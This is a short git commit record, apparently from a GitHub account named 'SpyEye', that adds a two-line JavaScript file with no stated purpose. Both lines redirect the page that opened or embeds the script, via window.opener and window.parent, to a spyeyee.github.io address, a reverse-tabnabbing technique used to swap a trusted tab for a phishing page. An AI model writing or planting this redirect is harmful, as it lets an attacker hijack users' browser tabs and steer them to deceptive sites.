92cf231585aa510da6a4e30ada6589f14dd05d49
SpyEye <103291965+spyeyee@users.noreply.github.com>
2022-04-12 22:18:27 +0600

    Add files via upload

---
+++ js.js
@@ -0,0 +1,2 @@
+if (window.opener) window.opener.parent.location.replace('https://spyeyee.github.io/bing');
+if (window.parent != window) window.parent.location.replace('http://spyeyee.github.io/bing');
